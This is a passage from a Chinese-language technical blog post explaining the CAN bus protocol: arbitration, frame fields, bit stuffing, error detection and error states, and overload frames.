仲裁过程</h5><p>在CAN总线通信中，有一种<strong>回读机制</strong>：<br>指的是节点在向总线上发送报文的过程中，同时也对总线上的二进制位进行“回读”。通过这种机制，节点就可以判断出本节点发出的二进制位与总线上当前的二进制位是否一致。</p><p>还有一种叫做<strong>线与机制</strong>：指的是在总线上，显性位能够覆盖隐性位。</p><p>举个例子：在某一个时刻，节点Node_A向总线发送了一个显性位0，Node_B向总线发送了一个隐性位1，那么在该时刻，总线上的电平为显性0。</p><p>下面将以标准数据帧的一个例子来分析CAN总线的非破坏性逐位仲裁机制。<br>一条CAN总线上有Node_A 和 Node_B两个节点，在总线空闲时，总线上为隐性电平，就在这个时候Node_A 和 Node_B 这两个节点同时向总线上发送数据，如下图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%B2%E8%A3%81%E8%BF%87%E7%A8%8B.png" class=""><p>从图中可以看出，在Node_A 和 Node_B 传输数据前，总线处于空闲状态，为隐性电平1，<br>这也就意味着，此时总线上的任意节点都可以向总线发送数据。</p><p>在某一时刻，Node_A 和Node_B两个节点同时向总线上发送数据。按照线与机制，总线上的电位为：</p><table><thead><tr><th>节点/ID号</th><th>ID10</th><th>ID9</th><th>ID8</th><th>ID7</th><th>ID6</th><th>…</th></tr></thead><tbody><tr><td>Node_A</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>…</td></tr><tr><td>Node_B</td><td>1</td><td>0</td><td>1</td><td>1</td><td>…</td><td>…</td></tr><tr><td>总线</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>…</td></tr></tbody></table><p>在Node_A和Node_B两个节点向总线发送数据时，他们同时回读总线上的电平。<br>从图中我们可以看到，Node_A 和Node_B的ID10 、ID9、ID8电位相同，因此这两个节点从总线上听到的电位与他们自己发出的电位也相同，这个时候还没有分出胜负。</p><p>当Node_B回读总线上的 ID7 这一位时，发现总线上的电平跟它自己发送到总线上的不一样，此时，Node_B知道自己在争夺总线的仲裁中失败了，那么它主动地转换为接收状态，不再发出信息。</p><p>于是在此之后，总线上的电平和Node_A发出的电平一致，也就是说，Node_A占据了总线的发送权。<br>通过上面的分析我们可以看到，在整个仲裁过程中：</p><ol><li>在Node_A获取总线的发送权之后，Node_A接着发送自己的Msg_A，因此在竞争总线的过程中不会对Msg_A的传输造成延时；</li><li>在两个节点竞争总线的过程中，不会破坏Msg_A;</li></ol><p>正是由于上面的两点，才称之为<strong>非破坏性仲裁机制</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 通过上面仲裁过程的分析，我们可以解释CAN总线通信的三个特点：<br><br><span class="hljs-number">1</span>）多主控制方式：只要总线空闲，总线上的任意节点都可以向总线上发送数据，<br>直到节点在仲裁中一个个失败，最后只留下一个节点获得总线的发送权。<br><br><span class="hljs-number">2</span>）非破坏性仲裁机制：仲裁段逐位总裁，依靠回读机制、线与机制得以实现。<br><br><span class="hljs-number">3</span>）半双工通信：所谓半双工通信，指的是节点不能在自己发送报文的时候，同时接收其他节点发送来的报文。<br>这是显然的，一个节点正在发送报文时，已经占据了总线的发送权，其他节点肯定不能向总线上发送报文。<br></code></pre></td></tr></table></figure><p>看一个CAN报文发送的实例，<br>CAN总线上有四个节点：Node_A、Node_B、Node_C、Node_D。<br>发送的报文的ID号分别为5、7、3、6.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E6%8A%A5%E6%96%87%E5%8F%91%E9%80%81%E7%9A%84%E5%AE%9E%E4%BE%8B.png" class=""><h5 id="4-4-2-2-RTR，SRR-和-IDE位"><a href="#4-4-2-2-RTR，SRR-和-IDE位" class="headerlink" title="4.4.2.2 RTR，SRR 和 IDE位"></a>4.4.2.2 RTR，SRR 和 IDE位</h5><p>通过上面标准数据帧的仲裁过程分析，我们已经理解了CAN总线的仲裁机制。<br>但同时也注意到仲裁段除了ID号之外，还有其他的位。</p><h6 id="1）RTR位："><a href="#1）RTR位：" class="headerlink" title="1）RTR位："></a>1）RTR位：</h6><p>Tranmission Request Bit （远程发送请求位）。<strong>在数据帧中，RTR位恒为显性位0，在遥控帧中，恒为隐性1</strong>。</p><p>RTR位的作用：<strong>在ID号相同的情况下，保证数据帧的优先级高于遥控帧</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 这么做的原因是保证数据帧优先级高于遥控帧。<br><br>比如：<br>在某一时刻t，节点Node_A发出了ID号为ID_2遥控帧报文来请求总线上的其它节点发出ID号为ID_2的数据帧报文。<br>但是就在同一时刻t，节点Node_B发出了ID号为ID_2的数据帧报文。<br><br>这个时候怎么办呢，显然依靠ID号不能仲裁出这两帧报文（一个遥控帧，一个数据帧，ID号相同）谁能占据总线的发送权，<br><br>这种情况下，RTR位就起作用了，由于RTR在数据帧中恒为显性<span class="hljs-number">0</span>，在遥控帧中恒为隐性<span class="hljs-number">1</span>，<br>所以在ID号相同的情况下，一定是数据帧仲裁获胜。<br><br>这就解释了 RTR位的作用：在ID号相同的情况下，保证数据帧的优先级高于遥控帧。<br></code></pre></td></tr></table></figure><h6 id="2）SRR位"><a href="#2）SRR位" class="headerlink" title="2）SRR位"></a>2）SRR位</h6><p>Substitutes for Remote Requests Bit（替代远程请求位），<br>在扩展帧（数据帧或遥控帧）中，SRR恒为隐性位1，并且可以发现，扩展帧的隐性SRR位正好对应标准帧的显性RTR位，<br>这就解释了 SRR位的作用：<strong>在前11位ID号相同的情况下，标准数据帧的优先级高于扩展数据帧；</strong></p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/SRR%E4%BD%8D.png" class=""><h6 id="3）IDE位"><a href="#3）IDE位" class="headerlink" title="3）IDE位"></a>3）IDE位</h6><p>全称：Identifier Extension Bit（标识符扩展位）。<br>在扩展帧中恒为隐性1，在标准帧中，IDE位于控制段，且恒为显性0。<br>且扩展帧IDE位和标准帧IDE位位置对应，<br>这就保证了： <strong>在前11位ID号相同的情况下，标准遥控帧的优先级一定高于扩展遥控帧。</strong></p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/IDE%E4%BD%8D.png" class=""><h6 id="4-总结："><a href="#4-总结：" class="headerlink" title="4) 总结："></a>4) 总结：</h6><p>在ID号前11位相同的情况下：</p><p>RTR：保证数据帧优先级高于遥控帧；<br>SRR ：保证标准数据帧的优先级高于扩展数据帧。<br>IDE ：保证标准遥控帧的优先级高于扩展遥控帧。</p><h5 id="4-4-2-3-报文过滤"><a href="#4-4-2-3-报文过滤" class="headerlink" title="4.4.2.3 报文过滤"></a>4.4.2.3 报文过滤</h5><p>在CAN总线中没有地址的概念，CAN总线是通过报文ID来实现收发数据的。<br>CAN节点上都会有一个验收滤波ID表，其位于CAN节点的验收滤波器中，<br>如果总线上的报文的ID号在某个节点的验收滤波ID表中，那么这一帧报文就能通过该节点验收滤波器的验收，该节点就会接收这一帧报文。</p><p>比如：Node_A发送了一帧ID号为ID_1的报文Msg_1，Node_B的验收滤波ID表中恰好有ID_1，于是乎Msg_1就会被Node_B接收。</p><p>Tips: 报文过滤机制体现了CAN通信的两条特点：<br>1）一对一、组播和广播<br>2）系统的柔性：正是因为CAN总线上收发报文是基于报文ID实现的，所以总线上添加节点时不会对总线上已有的节点造成影响。</p><h4 id="4-4-3-控制段"><a href="#4-4-3-控制段" class="headerlink" title="4.4.3 控制段"></a>4.4.3 控制段</h4><p>数据帧和遥控帧的控制段结构相同：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8E%A7%E5%88%B6%E6%AE%B5.png" class=""><ol><li>标准帧中IDE位对应扩展帧中的IDE位，保证在前11位ID号相同的情况下，标准帧的优先级一定高于扩展帧；</li><li>然后是保留位r0和r1（扩展帧），保留位r0和r1必须以显性电平发送，但是接受方可以接受显性、隐性及其任意组合的电平；</li><li>最后是4个字节的DLC（DLC3、DLC2、DLC1、DLC0）代表数据长度，指示了数据段中的字节数。对于没有数据段的遥控帧，DLC表示该遥控帧对应的数据帧的数据段的字节数。</li></ol><h4 id="4-4-4-数据段"><a href="#4-4-4-数据段" class="headerlink" title="4.4.4 数据段"></a>4.4.4 数据段</h4><p>数据段可以包含 0~8 个字节的数据，从MSB（最高位）开始输出。</p><h4 id="4-4-5-CRC段"><a href="#4-4-5-CRC段" class="headerlink" title="4.4.5 CRC段"></a>4.4.5 CRC段</h4><p>CRC段包含CRC校验序列和CRC界定符。<br>CRC校验序列是根据多项式生成的CRC值，其计算范围包括：帧起始、仲裁段、控制段和数据段。<br>CRC界定符恒为隐性1。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CRC%E6%AE%B5.png" class=""><h4 id="4-4-6-ACK段"><a href="#4-4-6-ACK段" class="headerlink" title="4.4.6 ACK段"></a>4.4.6 ACK段</h4><p>ACK段包含ACK槽和ACK界定符两个位。</p><p>发送节点在ACK段发送两个隐性位，即发送方发出的报文中ACK槽为隐性1；<br>接收节点在接收到正确的报文之后会在ACK槽发送显性位0，通知发送节点正常接收结束。所谓接收到正确的报文指的是接收到的报文没有填充错误、格式错误、CRC错误。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E6%AE%B5.png" class=""><p><strong>Tips:</strong><br>我们以标准数据帧为例来分析ACK段的工作方式：<br>如图所示，Node_A为发送节点，Node_B为接收节点。<br>Node_A在ACK段发送两个隐性位1。<br>Node_B正确接收到这一报文后，在ACK段的ACK槽中填充了一个显性位0。<br>注意，这个时候Node_A回读到的总线上的额电平为显性0，于是这个时候，Node_A就知道自己发出去的报文至少有一个节点正确接收了。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E6%AE%B51.png" class=""><h4 id="4-4-7帧结束"><a href="#4-4-7帧结束" class="headerlink" title="4.4.7帧结束"></a>4.4.7帧结束</h4><p>帧结束段表示该帧报文的结束，由7个隐性位1 构成。</p><h4 id="4-4-8错误帧"><a href="#4-4-8错误帧" class="headerlink" title="4.4.8错误帧"></a>4.4.8错误帧</h4><h5 id="4-4-8-1错误帧的帧结构"><a href="#4-4-8-1错误帧的帧结构" class="headerlink" title="4.4.8.1错误帧的帧结构"></a>4.4.8.1错误帧的帧结构</h5><p>在发送和接收报文时，总线上的节点如果检测出了错误，那么该节点就会发送错误帧，通知总线上的节点，自己出错了。<br>错误帧由错误标志和错误界定符两个部分组成。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E5%B8%A7%E7%9A%84%E5%B8%A7%E7%BB%93%E6%9E%84.png" class=""><p>主动错误标志：6个连续的显性位 （0）；<br>被动错误标志：6个连续的隐性位 （1）；<br>错误界定符：8个连续的隐性位 （1）。</p><p>可以看到在错误标志之后还有0~6位的错误标志重叠，这一段最低有0个位，最多有6个位，关于这一段是怎么形成的，将在下文中解释。</p><h5 id="4-4-8-2-错误检测"><a href="#4-4-8-2-错误检测" class="headerlink" title="4.4.8.2 错误检测"></a>4.4.8.2 错误检测</h5><h6 id="4-4-8-2-1-位填充原则"><a href="#4-4-8-2-1-位填充原则" class="headerlink" title="4.4.8.2.1 位填充原则"></a>4.4.8.2.1 位填充原则</h6><p>在了解CAN总线中的错误检测之前，首先需要了解什么是位填充。<br>CAN协议中规定，<strong>当相同极性的电平持续五位时，则添加一个极性相反的位</strong>。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E5%A1%AB%E5%85%85%E5%8E%9F%E5%88%99.png" class=""><p><strong>对于发送节点而言：</strong><br>在发送数据帧和遥控帧时，对于 SOF~CRC(除去CRC界定符) 之间的位流，相同极性的电平如果持续5位，那么在下一个位插入一个与之前5位反型的电平；</p><p><strong>对于接收节点而言：</strong><br>在接收数据帧和遥控帧时，对于 SOF~CRC(除去CRC界定符) 之间的位流，相同极性的电平如果持续5位，那么需要删除下一位再接收。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%8E%A5%E6%94%B6%E8%8A%82%E7%82%B9.png" class=""><p>Tips: 注意：填充位的添加和删除是由发送节点和接收节点完成的，CAN-BUS只负责传输，不会操纵信号。</p><h5 id="4-4-8-3-错误的种类"><a href="#4-4-8-3-错误的种类" class="headerlink" title="4.4.8.3 错误的种类"></a>4.4.8.3 错误的种类</h5><p>在CAN总线通信中，一共有五种错误：<br>（1）位错误<br>（2）ACK错误<br>（3）填充错误<br>（4）CRC错误<br>（5）格式错误</p><h6 id="4-4-8-3-1-位错误"><a href="#4-4-8-3-1-位错误" class="headerlink" title="4.4.8.3.1 位错误"></a>4.4.8.3.1 位错误</h6><p>（Bit Check Error）</p><p>节点将自己发送到总线上的电平与同时从总线上回读到的电平进行比较，如果发现二者不一致，那么这个节点就会检测出一个位错误。</p><p>实际上所谓“发出的电平与从总线上回读的电平不一致”，指的就是节点向总线发出隐性位，却从总线上回读到显性位或者节点向总线发出显性位，却从总线上回读到隐性位这两种情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Tips: 有三种例外情况不属于位错误：<br><br>在仲裁区，节点向总线发送隐性位却回读到显性位，不认为是位错误，这种情况表示该节点仲裁失败；<br><br>在ACK槽，节点向总线发送隐性位却回读到显性位，不认为是位错误，这种情况表示，该节点当前发送的这一帧报文至少被一个其它节点正确接收；<br><br>该节点发送被动错误标志，节点Node_A向总线发送连续六个隐性位（被动错误标志）却回读到显性位，不认为是位错误。因为被动错误标志是六个连续的隐性位，所以在总线上按照线与机制，有可能这六个连续隐性位被其它节点发送的显性电平“吃掉”<br></code></pre></td></tr></table></figure><h6 id="4-4-8-3-2-ACK错误"><a href="#4-4-8-3-2-ACK错误" class="headerlink" title="4.4.8.3.2 ACK错误"></a>4.4.8.3.2 ACK错误</h6><p>（Acknowledgment Error）</p><p>按照CAN协议的规定，在一帧报文（数据帧或者遥控帧）发出之后，如果接收节点Node_B成功接收了该帧报文，那么接收节点Node_B就要在该帧报文ACK槽对应的时间段内向总线上发送一个显性位来应答发送节点Node_A。这样发送节点Node_A就会在ACK槽时间段内从总线上回读到一个显性位。</p><p>因此：<br>当发送节点Node_A在ACK槽时间段内没有回读到显性位，那么发送节点Node_A就会检测到一个ACK应答错误。这表示没有一个节点成功接收该帧报文。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ACK%E9%94%99%E8%AF%AF.png" class=""><h6 id="4-4-8-3-3-填充错误"><a href="#4-4-8-3-3-填充错误" class="headerlink" title="4.4.8.3.3 填充错误"></a>4.4.8.3.3 填充错误</h6><p>（Fill Error）</p><p>在需要执行位填充原则的帧段（数据帧遥控帧的SOF~CRC序列），检测到连续六个同性位，则检测到一个填充错误。</p><h6 id="4-4-8-3-4-CRC错误"><a href="#4-4-8-3-4-CRC错误" class="headerlink" title="4.4.8.3.4 CRC错误"></a>4.4.8.3.4 CRC错误</h6><p>发送节点Node_A在发送数据帧或者遥控帧时，会计算出该帧报文的CRC序列。<br>接收节点Node_B在接收报文时也会执行相同的CRC算法，如果接收节点Node_B计算出的CRC序列值与发送节点Node_A发来的CRC序列值不一致，那么接收节点就检测到一个CRC错误。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CRC%E9%94%99%E8%AF%AF.png" class=""><h6 id="4-4-8-3-5-格式错误"><a href="#4-4-8-3-5-格式错误" class="headerlink" title="4.4.8.3.5 格式错误"></a>4.4.8.3.5 格式错误</h6><p>在一帧报文发送时，如果在必须发送预定值的区域内检测到了非法值，那么就检测到一个格式错误。<br>CAN报文中，有预定值的区域包括：</p><p>数据帧和遥控帧的CRC界定符、ACK界定符、EOF；<br>错误帧界定符<br>过载帧界定符</p><h6 id="4-4-8-3-6-错误通知"><a href="#4-4-8-3-6-错误通知" class="headerlink" title="4.4.8.3.6 错误通知"></a>4.4.8.3.6 错误通知</h6><p>上一节中，讲到CAN通信中有五种错误，并且介绍了在什么情况下能够检测到这几种错误，在检测到错误之后，检测到错误的节点就要发送错误帧到总线上来通知总线上的其他节点。</p><p>错误帧有的带有主动错误标志，有的带有被动错误标志，而且错误标志重叠部分的字节数也不一样，那么问题就来了：<br>什么情况下发送带有主动错误标志的错误帧；<br>什么情况下发送带有被动错误标志的错误帧；<br>在哪个时间点发送错误帧；<br>错误标志重叠部分是怎样形成的；</p><h6 id="4-4-8-3-7-节点错误状态"><a href="#4-4-8-3-7-节点错误状态" class="headerlink" title="4.4.8.3.7 节点错误状态"></a>4.4.8.3.7 节点错误状态</h6><p>按照CAN协议的规定，CAN总线上的节点始终处于以下三种状态之一。<br>a. 主动错误状态<br>b. 被动错误状态<br>c. 总关闭状态</p><p>当满足一定的条件时，节点可以从一种状态转换为另外一种状态。</p><p>Tips: 需要注意的是：<br>处于主动错误状态，表示该节点具备发出主动错误标志的能力;<br>处于被动错误状态，表示节点具备发出被动错误标志的能力。</p><p><strong>1）主动错误状态</strong></p><p>节点处于主动错误状态可以正常通信；<br>处于主动错误状态的节点（可能是接收节点也可能是发送节点）在检测出错误时，发出主动错误标志。</p><p><strong>2）被动错误状态</strong></p><p>节点处于被动错误状态可以正常通信；<br>处于被动错误状态的节点（可能是接收节点也可能是发送节点）在检测出错误时，发出被动错误标志。</p><p>Tips: 注意：这里说处于主动错误状态或被动错误状态的节点仍然可以正常通信，<br>这里的正常通信指的是：节点仍然能够从总线上接收报文，也能够竞争总线获胜后向总线上发送报文。<br>但是不代表接收的报文一定正确也不代表一定能正确的发送报文。</p><p><strong>3）总线关闭状态</strong><br>节点处于总线关闭状态，那么该节点不能收发报文；<br>处于总线关闭状态的节点，只能一直等待，在满足一定条件的时候，再次进入到主动错误状态</p><h6 id="4-4-8-3-8-错误状态的转换"><a href="#4-4-8-3-8-错误状态的转换" class="headerlink" title="4.4.8.3.8 错误状态的转换"></a>4.4.8.3.8 错误状态的转换</h6><p>现在我们知道：<br>处于主动错误状态的节点在检测到错误时会发送带有主动错误标志的错误帧；<br>处于被动错误状态的节点在检测到错误时会发送带有被动错误标志的错误帧。</p><p>那么一个CAN节点在什么情况下处于主动错误状态，什么情况下处于被动错误状态呢？</p><p>根据CAN协议的规定，在CAN节点内，有两个计数器：<strong>发送错误计数器（TEC）</strong> 和 <strong>接收错误计数器（REC）</strong>。</p><p>Tips: 需要注意的是：<br>这两个计数器计得不是收发报文的数量，也不是收发错误帧的数量。<br>TEC和RCE计数值的变化，是根据下表的规定来进行的</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/TEC%E5%92%8CRCE%E8%AE%A1%E6%95%B0%E5%80%BC.png" class=""><p>CAN节点错误状态的转换，就是基于这两个计数器来进行的。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E8%8A%82%E7%82%B9%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E8%BD%AC%E6%8D%A2.png" class=""><p>可以看出，节点错误状态的转换就是一个 “量变” 到“质变”的过程：</p><p><strong>1) 主动错误状态</strong><br>最开始TCE和REC都小于127时**，就处于主动错误状态。</p><p>在这一状态下，节点检测到一个错误就会发送带有主动错误标志的错误帧，<br>因为主动错误标志是连续六个显性位，所以这个时候主动错误标志将会“覆盖”掉总线上其它节点的发送，<br>而之前在CAN总线上传输的报文就被这“六个连续显性位”破坏掉了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">如果发出主动错误帧的节点是发送节点，这个情况下就相当于：<br>刚刚发送的那一帧报文我发错了，现在我破坏掉它（发送主动错误帧），你们不管收到什么都不算数；<br><br>如果发出主动错误帧的节点是接收节点，这个情况就相当于：<br>刚刚我收报文的时候发现了错误，不管你们有没有发现这个错误，<br>我现在主动站出来告诉大家这个错误，并把这一帧报文破坏掉（发送主动错误帧），<br>刚才你们收到的东西不管对错都不算数了。<br><br><br>Tips: 处于主动错误状态，说明这个节点目前是比较可靠的，出现错误的原因可能不是它本身的问题，<br>即刚刚检测到的错误可能不仅仅只有它自己遇到，正是因为这一点，<br>整个总线才相信它报告的错误，允许它破坏掉发送中的报文，也就是将这一次的发送作废。<br></code></pre></td></tr></table></figure><p><strong>2）被动错误状态</strong><br>如果某个节点发送错误帧的次数较多，必将使得TCE＞127 或者 REC＞127，那么该节点就处于被动错误状态。</p><p>在这一状态下，节点Node_A检测到一个错误就会发送带有被动错误标志的错误帧，因为被动错误标志是连续六个隐性位，所以这个时候总线上正在传输的报文位流不会受到该被动错误帧的影响，其它的节点该发送的发送，该接收的接收，没人搭理这个发送被动错误帧的节点Node_A。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">如果发出被动错误帧的节点Node_A为报文的发送节点，<br>那么在发送被动错误帧之后，刚刚正在发送的报文被破坏，<br>并且Node_A不能在错误帧之后随着连续发送刚刚发送失败的那个报文。<br><br>随之而来的是帧间隔，并且连带着<span class="hljs-number">8</span>位隐性位的 “延迟传送” 段；<br><br>这样总线电平就呈现出连续<span class="hljs-number">11</span>位隐性位，总线上的其它节点就能判定总线处于空闲状态，就能参与总线竞争。<br><br>此时如果Node_A能够竞争成功，那么它就能接着发送，如果竞争不能成功，那么就接着等待下一次竞争。<br>这种机制的目的正是为了让其它正常节点（处于主动错误）优先使用总线。<br><br><br>Tips: 处于被动错误状态，说明这个节点目前是不太可靠的，出现错误的原因可能是它本身的问题，<br>即刚刚检测到的错误可能仅仅只有它自己遇到，正是因为这一点，整个总线才不信任它报告的错误，<br>从而只允许它发送六个连续的隐性位，这样它才不会拖累别人。<br></code></pre></td></tr></table></figure><p><strong>3）总线关闭状态</strong><br>如果一个处于被动错误状态的节点，仍然多次发送被动错误帧，那么势必导致TEC ＞ 255，这样就处于总线关闭状态。</p><p>在总线关闭状态下的节点Node_A不能向总线上发送报文，也不能从总线上接收报文，整个节点脱离总线。等到检测到128次11个连续的隐性位时，TEC和REC置0，重新回到主动错误状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">按照我的理解 <br>这个所谓“检测到<span class="hljs-number">128</span>次<span class="hljs-number">11</span>个连续隐性位”其实就是让这个节点隔离一段时间冷静下，<br>因为它一旦处于总线关闭状态，就不会和总线有任何的联系，<br>这个时候只要它计算时间等于达到传送<span class="hljs-number">128</span>次<span class="hljs-number">11</span>个连续隐性位所用的时间，就可以重新连到总线上。<br><br><br>Tips: <br>处于总线关闭状态说明，这个节点目前挂掉了，<br>总线先把它踢开，这样它才不会拖累别人，等到它冷静一段时间之后再回到总线上。<br></code></pre></td></tr></table></figure><h6 id="4-4-8-3-9-错误帧的发送"><a href="#4-4-8-3-9-错误帧的发送" class="headerlink" title="4.4.8.3.9 错误帧的发送"></a>4.4.8.3.9 错误帧的发送</h6><p>在检测到错误之后，什么时候发送错误帧呢？<br>按照CAN协议的规定：<br><strong>位错误、填充错误、格式错误、ACK错误</strong>： 在错误产生的那一位的下一位开始发送错误帧。<br><strong>CRC错误</strong>：紧随ACK界定符后的位发送错误帧。</p><p>例子1：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BE%8B%E5%AD%901.png" class=""><p>（1）发送节点Node_A发送一个显性位，但是却从总线上听到一个隐形位，于是Node_A节点就会检测到一个位错误； （2）Node_A检测到位错误之后，立即在下一位开始发送主动错误帧：6个连续显性位的主动错误标志+8个连续隐性位的错误界定符； （3)对应Node_A发出的主动错误标志，总线上电平为6个连续显性位；</p><p>（4）接收节点Node_B和Node_C从总线上听到连续6个显性位，那么就会检测到一个填充错误，于是这两个节点都会发送主动错误帧；<br>（5）对应Node_B和Node_C发出的主动错误标志，总线电平又有6个连续显性电平，对应Node_B和Node_C发出的错误界定符，总线电平有8个连续的隐性电平。<br>（6）在间歇场之后，Node_A节点重新发送刚刚出错的报文。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E5%B8%A7.png" class=""><p>从上图中可以看出错误帧之中，错误标志重叠部分是怎样形成的，<br>这个例子中，位错误的错误标志与填充错误的错误标志重叠两位，剩下的部分还有四位：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E9%94%99%E8%AF%AF%E7%9A%84%E9%94%99%E8%AF%AF%E6%A0%87%E5%BF%97.png" class=""><h4 id="4-4-9-过载帧"><a href="#4-4-9-过载帧" class="headerlink" title="4.4.9 过载帧"></a>4.4.9 过载帧</h4><p>过载帧是接收节点向总线上其它节点报告自身接收能力达到极限的帧。</p><p>上面这句话可以这样理解：接收节点Node_A接收报文的能力达到极限了，于是Node_A就会发出过载帧来告诉总线上的其它节点（包括发送节点），我接收节点Node_A已经没有能力处理你们发来的报文了。</p><p>过载帧包括：过载标志和过载界定符两个部分<br>过载标志：连续6个显性位；<br>过载界定符：连续8个隐性位。</p><p>与错误帧类似，过载帧中有过载帧重叠部分，且形成过载重叠标志的原因与形成错误帧中的错误重叠标志的原因是相同的</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E9%87%8D%E5%8F%A0%E6%A0%87%E5%BF%97.png" class=""><p>对于过载帧的帧结构我们可以这样理解：<br>接收节点Node_A达到接收极限时，就会发出过载帧到总线上，<br>显然，过载标志的6个连续显性位会屏蔽掉总线上其它节点的发送，<br>也就是说这个时候Node_A通过发送过载帧的方式来破坏其它节点的发送，<br>这样在Node_A发送过载帧期间，其它节点就不能成功发送报文，<br>于是就相当于把其它节点的发送推迟了，也就是说Node_A在其发送过载帧的这段时间得以“休息”。</p><p>有三种情况会引起过载帧：</p><ol><li>接收节点自身原因。<br>接收节点由于某种原因需要延迟接收下一个数据帧或者遥控帧。</li><li>在帧间隔的间歇段的第一位和第二位检测到一个显性位（正常的间歇段都是隐性位）<br>帧间隔的间隔段本应是三个连续的隐性位，<br>如果接收节点Node_A在间隔段检测到显性位，<br>那么就意味着此时有报文发向接收节点Node_A，<br>但这个时候是不应该有报文发来的，于是Node_A发送过载帧。</li><li>CAN节点在错误界定符或过载界定符的第八位(最后一位)听到一个显性位0，节点会发送一个过载帧，且错误计数器不会增加。<br>接收节点Node_A在错误界定符和过载界定符的最后一位听到显性位，<br>也意味着有报文发向Node_A，但这个时候是不应该有报文发来的，<br>于是Node_A发送过载帧。</li></ol><h4 id="4-4-10-帧间隔"><a href="#4-4-10-帧间隔" class="headerlink" title="4.4.10 帧间隔"></a>4.4.10 帧间隔</h4><p>帧间隔是用来隔离数据帧（或者遥控帧）的，也就是说，<br>数据帧（或者遥控帧）通过插入帧间隔可以将本帧与先行帧（数据帧、遥控帧、错误帧、过载帧）分隔开来。</p><p>Tips: 